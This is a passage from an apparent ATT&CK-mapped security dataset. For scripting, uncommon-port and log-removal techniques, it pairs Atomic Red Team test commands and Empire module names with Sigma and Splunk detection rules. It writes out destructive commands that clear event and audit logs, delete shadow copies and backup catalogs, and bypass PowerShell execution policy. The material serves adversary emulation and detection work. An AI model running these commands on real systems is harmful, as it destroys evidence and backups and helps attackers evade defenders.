{"Threat Hunting Tables": {"chain_id": "100105", "os": "windows", "parent_process": "wscript.exe", "commandline_string": "", "sub_process_1": "*.vbe", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "scripting", "mitre_attack": "T1064", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100106", "os": "windows", "parent_process": "wscript.exe", "commandline_string": "", "sub_process_1": "*.js", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "scripting", "mitre_attack": "T1064", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100107", "os": "windows", "parent_process": "wscript.exe", "commandline_string": "", "sub_process_1": "*.vba", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "scripting", "mitre_attack": "T1064", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100108", "os": "windows", "parent_process": "wscript.exe", "commandline_string": "", "sub_process_1": "*.vbs", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "scripting", "mitre_attack": "T1064", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100126", "os": "windows", "parent_process": "winword.exe", "commandline_string": "", "sub_process_1": "javaw.exe", "sub_process_2": "java.exe", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "scripting", "mitre_attack": "T1064", "itw_sample": "https://www.joesandbox.com/analysis/35201/0/html"}}, {"SysmonHunter - T1064": {"name": "Scripting", "description": null, "level": "high", "phase": "Execution", "query": [{"type": "process", "process": {"any": {"pattern": "wscript.exe|cscript.exe"}}}]}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/code_execution/invoke_metasploitpayload", "ATT&CK Technique #1": "T1064", "ATT&CK Technique #2": "", "Technique": "Scripting", "Concatenate for Python Dictionary": "\"powershell/code_execution/invoke_metasploitpayload\":  [\"T1064\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/management/invoke_script", "ATT&CK Technique #1": "T1064", "ATT&CK Technique #2": "", "Technique": "Scripting", "Concatenate for Python Dictionary": "\"powershell/management/invoke_script\":  [\"T1064\"],"}}], "command_list": ["sh -c \"echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh\"\nsh -c \"echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh\"\nchmod +x /tmp/art.sh\nsh /tmp/art.sh\n", "Start-Process #{script_path}\n", "Start-Process $env:TEMP\\T1064_script.bat\n", {"windows": {"psh": {"command": "Set-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell -Name ExecutionPolicy -Value ByPass;\n        $shell = New-Object -ComObject Wscript.Shell\n        Set-ExecutionPolicy Bypass | echo $shell.sendkeys(\"Y`r`n\")"}}}, {"windows": {"psh": {"command": "$job = Start-Job -ScriptBlock {\n  $username = '#{host.user.name}';\n  $password = '#{host.user.password}';\n  $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;\n  $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;\n  Start-Process Notepad.exe -NoNewWindow -PassThru -Credential $credential;\n};\nReceive-Job -Job $job -Wait;\n"}}}, "cscript.exe", "*.jse", "cscript.exe", "*.vbe", "cscript.exe", "*.js", "cscript.exe", "*.vba", "cscript.exe", "*.vbs", "excel.exe", "cmd.exe", "excel.exe", "cscript.exe", "excel.exe", "wscript.exe", "excel.exe", "sh.exe", "excel.exe", "bash.exe", "mshta.exe", "cscript.exe", "mshta.exe", "wscript.exe", "powerpoint.exe", "cmd.exe", "powerpoint.exe", "cscript.exe", "powerpoint.exe", "wscript.exe", "powerpoint.exe", "sh.exe", "powerpoint.exe", "bash.exe", "winword.exe", "cmd.exe", "powershell.exe", "winword.exe", "cmd.exe", "winword.exe", "cscript.exe", "winword.exe", "wscript.exe", "winword.exe", "sh.exe", "winword.exe", "bash.exe", "winword.exe", "csc.exe", "cvtres.exe", "wscript.exe", "wscript.exe", "*.jse", "wscript.exe", "*.vbe", "wscript.exe", "*.js", "wscript.exe", "*.vba", "wscript.exe", "*.vbs", "winword.exe", "javaw.exe", "java.exe", "wscript.exe|cscript.exe", "powershell/code_execution/invoke_metasploitpayload", "powershell/code_execution/invoke_metasploitpayload", "powershell/management/invoke_script", "powershell/management/invoke_script", "Creates and executes a simple bash script."], "attack_paths": [], "queries": [{"product": "Splunk", "query": "index=linux sourcetype=linux_audit syscall=59 OR syscall=322  | table host,syscall,syscall_name,exe,auid", "name": null}, {"product": "Splunk", "query": "This could be very overwhelming if whitelisting is not done.", "name": null}], "possible_detections": [{"data_source": "auditlogs (audit.rules)"}, {"data_source": {"title": "WMIExec VBS Script", "id": "966e4016-627f-44f7-8341-f394905c361f", "description": "Detects suspicious file execution by wscript and cscript", "author": "Florian Roth", "references": ["https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf"], "tags": ["attack.execution", "attack.g0045", "attack.t1064"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Image": "*\\cscript.exe", "CommandLine": "*.vbs /shell *"}, "condition": "selection"}, "fields": ["CommandLine", "ParentCommandLine"], "falsepositives": ["Unlikely"], "level": "critical"}}, {"data_source": {"title": "CACTUSTORCH Remote Thread Creation", "id": "2e4e488a-6164-4811-9ea1-f960c7359c40", "description": "Detects remote thread creation from CACTUSTORCH as described in references.", "references": ["https://twitter.com/SBousseaden/status/1090588499517079552", "https://github.com/mdsecactivebreach/CACTUSTORCH"], "status": "experimental", "author": "@SBousseaden (detection), Thomas Patzke (rule)", "logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection": {"EventID": 8, "SourceImage": ["*\\System32\\cscript.exe", "*\\System32\\wscript.exe", "*\\System32\\mshta.exe", "*\\winword.exe", "*\\excel.exe"], "TargetImage": "*\\SysWOW64\\\\*", "StartModule": null}, "condition": "selection"}, "tags": ["attack.execution", "attack.t1055", "attack.t1064"], "falsepositives": ["unknown"], "level": "high"}}, {"data_source": {"title": "Suspicious File Characteristics due to Missing Fields", "id": "9637e8a5-7131-4f7f-bdc7-2b05d8670c43", "description": "Detects Executables without FileVersion,Description,Product,Company likely created with py2exe", "status": "experimental", "references": ["https://securelist.com/muddywater/88059/", "https://www.virustotal.com/#/file/276a765a10f98cda1a38d3a31e7483585ca3722ecad19d784441293acf1b7beb/detection"], "author": "Markus Neis", "date": "2018/11/22", "modified": "2019/11/09", "tags": ["attack.defense_evasion", "attack.execution", "attack.t1064"], "logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection1": {"Description": "\\?", "FileVersion": "\\?"}, "selection2": {"Description": "\\?", "Product": "\\?"}, "selection3": {"Description": "\\?", "Company": "\\?"}, "condition": "1 of them"}, "fields": ["CommandLine", "ParentCommandLine"], "falsepositives": ["Unknown"], "level": "medium"}}, {"data_source": {"action": "global", "title": "Adwind RAT / JRAT", "id": "1fac1481-2dbc-48b2-9096-753c49b4ec71", "status": "experimental", "description": "Detects javaw.exe in AppData folder as used by Adwind / JRAT", "references": ["https://www.hybrid-analysis.com/sample/ba86fa0d4b6af2db0656a88b1dd29f36fe362473ae8ad04255c4e52f214a541c?environmentId=100", "https://www.first.org/resources/papers/conf2017/Advanced-Incident-Detection-and-Threat-Hunting-using-Sysmon-and-Splunk.pdf"], "author": "Florian Roth, Tom Ueltschi", "date": "2017/11/10", "modified": "2018/12/11", "tags": ["attack.execution", "attack.t1064"], "detection": {"condition": "selection"}, "level": "high"}}, {"data_source": {"logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"CommandLine": ["*\\AppData\\Roaming\\Oracle*\\java*.exe *", "*cscript.exe *Retrive*.vbs *"]}}}}, {"data_source": {"logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection": {"EventID": 11, "TargetFilename": ["*\\AppData\\Roaming\\Oracle\\bin\\java*.exe", "*\\Retrive*.vbs"]}}}}, {"data_source": {"logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection": {"EventID": 13, "TargetObject": "\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run*", "Details": "%AppData%\\Roaming\\Oracle\\bin\\\\*"}}}}, {"data_source": {"title": "WScript or CScript Dropper", "id": "cea72823-df4d-4567-950c-0b579eaf0846", "status": "experimental", "description": "Detects wscript/cscript executions of scripts located in user directories", "author": "Margaritis Dimitrios (idea), Florian Roth (rule)", "tags": ["attack.defense_evasion", "attack.execution", "attack.t1064"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Image": ["*\\wscript.exe", "*\\cscript.exe"], "CommandLine": ["* C:\\Users\\\\*.jse *", "* C:\\Users\\\\*.vbe *", "* C:\\Users\\\\*.js *", "* C:\\Users\\\\*.vba *", "* C:\\Users\\\\*.vbs *", "* C:\\ProgramData\\\\*.jse *", "* C:\\ProgramData\\\\*.vbe *", "* C:\\ProgramData\\\\*.js *", "* C:\\ProgramData\\\\*.vba *", "* C:\\ProgramData\\\\*.vbs *"]}, "falsepositive": {"ParentImage": "*\\winzip*"}, "condition": "selection and not falsepositive"}, "fields": ["CommandLine", "ParentCommandLine"], "falsepositives": ["Winzip", "Other self-extractors"], "level": "high"}}, {"data_source": {"title": "Windows Shell Spawning Suspicious Program", "id": "3a6586ad-127a-4d3b-a677-1e6eacdf8fde", "status": "experimental", "description": "Detects a suspicious child process of a Windows shell", "references": ["https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html"], "author": "Florian Roth", "date": "2018/04/06", "modified": "2019/02/05", "tags": ["attack.execution", "attack.defense_evasion", "attack.t1064"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"ParentImage": ["*\\mshta.exe", "*\\powershell.exe", "*\\rundll32.exe", "*\\cscript.exe", "*\\wscript.exe", "*\\wmiprvse.exe"], "Image": ["*\\schtasks.exe", "*\\nslookup.exe", "*\\certutil.exe", "*\\bitsadmin.exe", "*\\mshta.exe"]}, "falsepositives": {"CurrentDirectory": "*\\ccmcache\\\\*"}, "condition": "selection and not falsepositives"}, "fields": ["CommandLine", "ParentCommandLine"], "falsepositives": ["Administrative scripts", "Microsoft SCCM"], "level": "high"}}, {"data_source": {"title": "Suspicious RASdial Activity", "id": "6bba49bf-7f8c-47d6-a1bb-6b4dece4640e", "description": "Detects suspicious process related to rasdial.exe", "status": "experimental", "references": ["https://twitter.com/subTee/status/891298217907830785"], "author": "juju4", "tags": ["attack.defense_evasion", "attack.execution", "attack.t1064"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"CommandLine": ["rasdial"]}, "condition": "selection"}, "falsepositives": ["False positives depend on scripts and administrative tools used in the monitored environment"], "level": "medium"}}, {"data_source": {"title": "WSF/JSE/JS/VBA/VBE File Execution", "id": "1e33157c-53b1-41ad-bbcc-780b80b58288", "status": "experimental", "description": "Detects suspicious file execution by wscript and cscript", "author": "Michael Haag", "tags": ["attack.execution", "attack.t1064"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Image": ["*\\wscript.exe", "*\\cscript.exe"], "CommandLine": ["*.jse", "*.vbe", "*.js", "*.vba"]}, "condition": "selection"}, "fields": ["CommandLine", "ParentCommandLine"], "falsepositives": ["Will need to be tuned. I recommend adding the user profile path in CommandLine if it is getting too noisy."], "level": "medium"}}, {"data_source": {"title": "WMI Spawning Windows PowerShell", "id": "692f0bec-83ba-4d04-af7e-e884a96059b6", "status": "experimental", "description": "Detects WMI spawning PowerShell", "references": ["https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_shell_spawn_susp_program.yml", "https://any.run/report/68bc255f9b0db6a0d30a8f2dadfbee3256acfe12497bf93943bc1eab0735e45e/a2385d6f-34f7-403c-90d3-b1f9d2a90a5e"], "author": "Markus Neis / @Karneades", "date": "2019/04/03", "tags": ["attack.execution", "attack.defense_evasion", "attack.t1064"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"ParentImage": ["*\\wmiprvse.exe"], "Image": ["*\\powershell.exe"]}, "condition": "selection"}, "falsepositives": ["AppvClient", "CCM"], "level": "high"}}]}, {"technique_id": "T1065", "commands": [{"source": "atomics/T1065/T1065.yaml", "command": "Test-NetConnection -ComputerName #{domain} -port 8081\n", "name": null}, {"source": "atomics/T1065/T1065.yaml", "command": "Test-NetConnection -ComputerName google.com -port #{port}\n", "name": null}, {"source": "atomics/T1065/T1065.yaml", "command": "telnet #{domain} 8081\n", "name": null}, {"source": "atomics/T1065/T1065.yaml", "command": "telnet google.com #{port}\n", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Adversaries may conduct C2 communications over a non-standard port to bypass proxies and firewalls.": {"attack_technique": "T1065", "display_name": "Adversaries may conduct C2 communications over a non-standard port to bypass proxies and firewalls.", "atomic_tests": [{"name": "Testing usage of uncommonly used port with PowerShell", "description": "Testing uncommonly used port utilizing PowerShell. APT33 has been known to attempt telnet over port 8081. Upon exectuion, details about the successful\nport check will be displayed.\n", "supported_platforms": ["windows"], "input_arguments": {"port": {"description": "Specify uncommon port number", "type": "String", "default": "8081"}, "domain": {"description": "Specify target hostname", "type": "String", "default": "google.com"}}, "executor": {"name": "powershell", "elevation_required": false, "command": "Test-NetConnection -ComputerName #{domain} -port #{port}\n"}}, {"name": "Testing usage of uncommonly used port", "description": "Testing uncommonly used port utilizing telnet.\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"port": {"description": "Specify uncommon port number", "type": "String", "default": "8081"}, "domain": {"description": "Specify target hostname", "type": "String", "default": "google.com"}}, "executor": {"name": "sh", "elevation_required": false, "command": "telnet #{domain} #{port}\n"}}]}}], "command_list": ["Test-NetConnection -ComputerName #{domain} -port 8081\n", "Test-NetConnection -ComputerName google.com -port #{port}\n", "telnet #{domain} 8081\n", "telnet google.com #{port}\n"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1070", "commands": [{"source": "atomics/T1070/T1070.yaml", "command": "wevtutil cl System\n", "name": null}, {"source": "atomics/T1070/T1070.yaml", "command": "fsutil usn deletejournal /D C:\n", "name": null}, {"source": "atomics/T1070/T1070.yaml", "command": "rm -rf /private/var/log/system.log*\nrm -rf /private/var/audit/*\n", "name": null}, {"source": "atomics/T1070/T1070.yaml", "command": "echo 0> /var/spool/mail/root\n", "name": null}, {"source": "atomics/T1070/T1070.yaml", "command": "echo 0> /var/log/secure\n", "name": null}, {"source": "atomics/T1070/T1070.yaml", "command": "$eventLogId = Get-WmiObject -Class Win32_Service -Filter \"Name LIKE 'EventLog'\" | Select-Object -ExpandProperty ProcessId\nStop-Process -Id $eventLogId -Force\nRemove-Item C:\\Windows\\System32\\winevt\\Logs\\Security.evtx\n", "name": null}, {"source": "atomics/T1070/T1070.yaml", "command": "Clear-EventLog -logname Application\n", "name": null}, {"source": "data/abilities/defense-evasion/fcf71ee3-d1a9-4136-b919-9e5f6da43608.yml", "command": {"windows": {"psh,pwsh": {"command": "Clear-Eventlog Security;\nClear-Eventlog System;\n"}}}, "name": "Clear Sysmon logs [intended to trigger CAR-2016-04-002]"}, {"source": "Threat Hunting Tables", "command": "fsutil.exe usn deletejournal /D", "name": null}, {"source": "Threat Hunting Tables", "command": "vssadmin.exe delete shadows /all /quiet", "name": null}, {"source": "Threat Hunting Tables", "command": "wbadmin.exe delete catalog -quiet", "name": null}, {"source": "Threat Hunting Tables", "command": "wevtutil.exe /cl", "name": null}, {"source": "Threat Hunting Tables", "command": "wmic.exe /NODE:*shadowcopy delete *", "name": null}, {"source": "SysmonHunter - Indicator Removal on Host", "command": "wevtutilcl", "name": null}, {"source": "SysmonHunter - Indicator Removal on Host", "command": "wevtutil|cl", "name": null}, {"source": "SysmonHunter - Indicator Removal on Host", "command": "fsutil|usn|deletejournal", "name": null}, {"source": "SysmonHunter - Indicator Removal on Host", "command": "fsutilusn|deletejournal", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/purge", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/purge", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/lock", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/lock", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/logoff", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/logoff", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/restart", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/restart", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/persistence/osx/RemoveDaemon", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/persistence/osx/RemoveDaemon", "name": "Empire Module Command"}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "rm -rf /var/log/*", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Indicator Removal on Host": {"attack_technique": "T1070", "display_name": "Indicator Removal on Host", "atomic_tests": [{"name": "Clear Logs", "description": "Upon execution this test will clear Windows Event Logs. Open the System.evtx logs at C:\\Windows\\System32\\winevt\\Logs and verify that it is now empty.\n", "supported_platforms": ["windows"], "input_arguments": {"log_name": {"description": "Windows Log Name, ex System", "type": "String", "default": "System"}}, "executor": {"name": "command_prompt", "elevation_required": true, "command": "wevtutil cl #{log_name}\n"}}, {"name": "FSUtil", "description": "Manages the update sequence number (USN) change journal, which provides a persistent log of all changes made to files on the volume. Upon exectuion, no output\nwill be displayed. More information about fsutil can be found at https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-usn\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": true, "command": "fsutil usn deletejournal /D C:\n", "cleanup_command": "fsutil usn createjournal m=1000 a=100 c:\n"}}, {"name": "rm -rf", "description": "Delete system and audit logs\n", "supported_platforms": ["macos", "linux"], "executor": {"name": "sh", "command": "rm -rf /private/var/log/system.log*\nrm -rf /private/var/audit/*\n"}}, {"name": "Overwrite Linux Mail Spool", "description": "This test overwrites the Linux mail spool of a specified user. This technique was used by threat actor Rocke during the exploitation of Linux web servers.\n", "supported_platforms": ["linux"], "input_arguments": {"username": {"description": "Username of mail spool", "type": "String", "default": "root"}}, "executor": {"name": "bash", "command": "echo 0> /var/spool/mail/#{username}\n"}}, {"name": "Overwrite Linux Log", "description": "This test overwrites the specified log. This technique was used by threat actor Rocke during the exploitation of Linux web servers.\n", "supported_platforms": ["linux"], "input_arguments": {"log_path": {"description": "Path of specified log", "type": "Path", "default": "/var/log/secure"}}, "executor": {"name": "bash", "command": "echo 0> #{log_path}\n"}}, {"name": "Delete System Logs Using PowerShell", "description": "Recommended Detection: Monitor for use of the windows event log filepath in PowerShell couple with delete arguments.\nUpon execution, open the Security.evtx logs at C:\\Windows\\System32\\winevt\\Logs and verify that it is now empty or has very few logs in it.\nWhen this service get's stopped, it is automatically restarted and the Security.evtx folder re-created.\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": true, "command": "$eventLogId = Get-WmiObject -Class Win32_Service -Filter \"Name LIKE 'EventLog'\" | Select-Object -ExpandProperty ProcessId\nStop-Process -Id $eventLogId -Force\nRemove-Item C:\\Windows\\System32\\winevt\\Logs\\Security.evtx\n", "cleanup_command": "Start-Service -Name EventLog\n"}}, {"name": "Delete System Logs Using Clear-EventLogId", "description": "Clear event logs using built-in PowerShell commands.\nUpon execution, open the Security.evtx logs at C:\\Windows\\System32\\winevt\\Logs and verify that it is now empty or has very few logs in it.\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": true, "command": "Clear-EventLog -logname Application\n"}}]}}, {"Mitre Stockpile - Clear Sysmon logs [intended to trigger CAR-2016-04-002]": {"id": "fcf71ee3-d1a9-4136-b919-9e5f6da43608", "name": "Clear Logs", "description": "Clear Sysmon logs [intended to trigger CAR-2016-04-002]", "tactic": "defense-evasion", "technique": {"attack_id": "T1070", "name": "Indicator Removal on Host"}, "privilege": "Elevated", "platforms": {"windows": {"psh,pwsh": {"command": "Clear-Eventlog Security;\nClear-Eventlog System;\n"}}}}}, {"Threat Hunting Tables": {"chain_id": "100034", "os": "windows", "parent_process": "fsutil.exe", "commandline_string": "usn deletejournal /D", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "indicator_removal", "mitre_attack": "T1070", "itw_sample": "https://www.joesecurity.org/reports/report-71b6a493388e7d0b40c83ce903bc6b04.html#overview"}}, {"Threat Hunting Tables": {"chain_id": "100083", "os": "windows", "parent_process": "vssadmin.exe", "commandline_string": "delete shadows /all /quiet", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "indicator_removal", "mitre_attack": "T1070", "itw_sample": "51bf86b51ec3a3bf21bc9a9ea7c00f2599efafda93535c2d7e92dd1d07380332"}}, {"Threat Hunting Tables": {"chain_id": "100084", "os": "windows", "parent_process": "wbadmin.exe", "commandline_string": "delete catalog -quiet", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "indicator_removal", "mitre_attack": "T1070", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100085", "os": "windows", "parent_process": "wevtutil.exe", "commandline_string": "/cl", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "indicator_removal", "mitre_attack": "T1070", "itw_sample": "https://www.joesecurity.org/reports/report-fbbdc39af1139aebba4da004475e8839.html"}}, {"Threat Hunting Tables": {"chain_id": "100101", "os": "windows", "parent_process": "wmic.exe", "commandline_string": "/NODE:*shadowcopy delete *", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "indicator_removal", "mitre_attack": "T1070", "itw_sample": ""}}, {"SysmonHunter - T1070": {"name": "Indicator Removal on Host", "description": null, "level": "high", "phase": "Defense Evasion", "query": [{"type": "process", "process": {"image": {"pattern": "wevtutil"}, "cmdline": {"pattern": "cl"}}}, {"type": "process", "process": {"cmdline": {"pattern": "wevtutil|cl", "op": "and"}}}, {"type": "process", "process": {"cmdline": {"pattern": "fsutil|usn|deletejournal", "op": "and"}}}, {"type": "process", "process": {"image": {"pattern": "fsutil"}, "cmdline": {"pattern": "usn|deletejournal", "op": "and"}}}]}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/credentials/mimikatz/purge", "ATT&CK Technique #1": "T1070", "ATT&CK Technique #2": "", "Technique": "Indicator Removal on Host", "Concatenate for Python Dictionary": "\"powershell/credentials/mimikatz/purge\":  [\"T1070\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/management/lock", "ATT&CK Technique #1": "T1070", "ATT&CK Technique #2": "", "Technique": "Indicator Removal on Host", "Concatenate for Python Dictionary": "\"powershell/management/lock\":  [\"T1070\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/management/logoff", "ATT&CK Technique #1": "T1070", "ATT&CK Technique #2": "", "Technique": "Indicator Removal on Host", "Concatenate for Python Dictionary": "\"powershell/management/logoff\":  [\"T1070\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/management/restart", "ATT&CK Technique #1": "T1070", "ATT&CK Technique #2": "", "Technique": "Indicator Removal on Host", "Concatenate for Python Dictionary": "\"powershell/management/restart\":  [\"T1070\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/persistence/osx/RemoveDaemon", "ATT&CK Technique #1": "T1070", "ATT&CK Technique #2": "", "Technique": "Indicator Removal on Host", "Concatenate for Python Dictionary": "\"python/persistence/osx/RemoveDaemon\":  [\"T1070\"],"}}], "command_list": ["wevtutil cl System\n", "fsutil usn deletejournal /D C:\n", "rm -rf /private/var/log/system.log*\nrm -rf /private/var/audit/*\n", "echo 0> /var/spool/mail/root\n", "echo 0> /var/log/secure\n", "$eventLogId = Get-WmiObject -Class Win32_Service -Filter \"Name LIKE 'EventLog'\" | Select-Object -ExpandProperty ProcessId\nStop-Process -Id $eventLogId -Force\nRemove-Item C:\\Windows\\System32\\winevt\\Logs\\Security.evtx\n", "Clear-EventLog -logname Application\n", {"windows": {"psh,pwsh": {"command": "Clear-Eventlog Security;\nClear-Eventlog System;\n"}}}, "fsutil.exe usn deletejournal /D", "vssadmin.exe delete shadows /all /quiet", "wbadmin.exe delete catalog -quiet", "wevtutil.exe /cl", "wmic.exe /NODE:*shadowcopy delete *", "wevtutilcl", "wevtutil|cl", "fsutil|usn|deletejournal", "fsutilusn|deletejournal", "powershell/credentials/mimikatz/purge", "powershell/credentials/mimikatz/purge", "powershell/management/lock", "powershell/management/lock", "powershell/management/logoff", "powershell/management/logoff", "powershell/management/restart", "powershell/management/restart", "python/persistence/osx/RemoveDaemon", "python/persistence/osx/RemoveDaemon", "```", "rm -rf /var/log/*", "```"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where process_path contains \"wevtutil\"", "name": "Indicator Removal On Host"}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "index=linux sourcetype=linux_audit syscall=263 | table host,auid,uid,euid,exe,key", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "index=linux sourcetype=linux_audit type=PATH name=*.log nametype=delete", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "-a always,exit -F arch=b64 -F PATH=/var/log -S unlinkat -F auid>=1000 -F auid!=4294967295 -F key=delete_logs", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "index=linux sourcetype=\"bash_history\" rm * .log | table host, user_name, bash_command", "name": null}, {"product": "Splunk", "query": "```", "name": null}], "possible_detections": [{"data_source": "auditlogs (audit.rules)"}, {"data_source": "bash_history logs"}, {"data_source": {"title": "Disable of ETW Trace", "id": "a238b5d0-ce2d-4414-a676-7a531b3d13d6", "description": "Detects a command that clears or disables any ETW trace log which could indicate a logging evasion.", "references": ["https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil", "https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_mal_lockergoga.yml", "https://abuse.io/lockergoga.txt"], "author": "@neu5ron, Florian Roth", "date": "2019/03/22", "tags": ["attack.execution", "attack.t1070", "car.2016-04-002"], "level": "high", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection_clear_1": {"CommandLine": "* cl */Trace*"}, "selection_clear_2": {"CommandLine": "* clear-log */Trace*"}, "selection_disable_1": {"CommandLine": "* sl* /e:false*"}, "selection_disable_2": {"CommandLine": "* set-log* /e:false*"}, "condition": "selection_clear_1 or selection_clear_2 or selection_disable_1 or selection_disable_2"}}}, {"data_source": {"title": "Suspicious eventlog clear or configuration using wevtutil", "id": "cc36992a-4671-4f21-a91d-6c2b72a2edf5", "description": "Detects clearing or configuration of eventlogs uwing wevtutil. Might be used by ransomwares during the attack (seen by NotPetya and others)", "author": "Ecco", "date": "2019/09/26", "tags": ["attack.execution", "attack.t1070", "car.2016-04-002"], "level": "high", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection_binary_1": {"Image": "*\\wevtutil.exe"}, "selection_binary_2": {"OriginalFileName": "wevtutil.exe"}, "selection_clear_1": {"CommandLine": "* cl *"}, "selection_clear_2": {"CommandLine": "* clear-log *"}, "selection_disable_1": {"CommandLine": "* sl *"}, "selection_disable_2": {"CommandLine": "* set-log *"}, "condition": "(1 of selection_binary_*) and (1 of selection_clear_* or 1 of selection_disable_*)"}, "falsepositives": ["Admin activity", "Scripts and administrative tools used in the monitored environment"]}}, {"data_source": {"title": "Eventlog Cleared", "id": "d99b79d2-0a6f-4f46-ad8b-260b6e17f982", "description": "One of the Windows Eventlogs has been cleared. e.g. caused by \"wevtutil cl\" command execution", "references": ["https://twitter.com/deviouspolack/status/832535435960209408", "https://www.hybrid-analysis.com/sample/027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745?environmentId=100"], "author": "Florian Roth", "tags": ["attack.defense_evasion", "attack.t1070", "car.2016-04-002"], "logsource": {"product": "windows", "service": "system"}, "detection": {"selection": {"EventID": 104, "Source": "Microsoft-Windows-Eventlog"}, "condition": "selection"}, "falsepositives": ["Unknown"], "level": "medium"}}, {"data_source": {"title": "Security Eventlog 